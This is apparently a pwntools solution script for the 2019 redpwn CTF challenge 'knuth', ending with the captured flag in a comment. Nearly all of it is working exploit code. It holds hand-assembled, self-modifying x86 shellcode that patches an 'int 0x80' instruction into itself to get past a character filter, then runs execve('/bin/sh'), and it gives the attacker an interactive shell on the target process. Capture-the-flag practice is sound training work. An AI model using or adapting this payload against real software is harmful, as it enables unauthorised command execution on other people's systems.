from pwn import *


def exploit():
#	io = remote("chall.2019.redpwn.net", 4009)
	io = process("./knuth")

	shellcode = asm("""

	/* argument points to base address of this code */
	pop ecx
	pop ecx
	pop ecx
	pop ecx
	pop ecx

	/* NULL edx and eax */
	push 0x6a6a6a6a
	pop eax
	xor eax, 0x6a6a6a6a
	push eax
	pop edx

	/* Write opcode 80CD in eax */
	dec ax  /*0xffff*/
	xor ax, 0x4f65
	xor ax, 0x3057
	/*opcode 0x000080CD is in eax*/

	/* AND with NULL */
	and [ecx+62], edx
	/* XOR with 80CD */
	xor [ecx+62], eax

	/* Null eax */
	push edx
	pop eax

	/* PUSH 0x00000000*/
	push eax

	/* PUSH /bin/sh */
	push 0x68732f2f
	push 0x6e69622f

	/* put ptr to binsh string in ebx */
	push esp
	pop ebx

	/* 0xb in eax for execve syscall */
	inc eax
	inc eax 
	inc eax 
	inc eax 
	inc eax 
	inc eax
	inc eax 
	inc eax 
	inc eax 
	inc eax
	inc eax

	/* Null ecx */
	push edx
	pop ecx
	""")
	print len(shellcode)

	io.sendline(shellcode)
	io.interactive()
	io.close()	
	
#flag{ok so basically, this is a flag-~-urfnatoufnruiantoeakolfhepicqniuwnfkteoikcoyuqnouqnwfounoakfentou}

exploit()

